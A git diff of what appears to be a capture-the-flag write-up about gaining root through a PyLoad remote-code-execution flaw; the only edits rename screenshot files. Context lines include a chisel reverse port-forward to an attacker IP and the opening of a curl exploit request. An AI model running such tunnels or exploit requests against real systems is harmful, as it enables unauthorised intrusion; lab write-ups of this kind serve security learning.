@@ -316,7 +316,7 @@ chisel client 10.10.14.39 5555 R:8000:127.0.0.1:8000
 
 Here, we will see a PyLoad instance.
 
-<figure><img src="../../.gitbook/assets/image (3) (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 This software had a recent RCE vulnerability found within it.
 
@@ -343,6 +343,6 @@ $ curl -i -s -k -X $'POST' \
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (4) (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!&#x20;
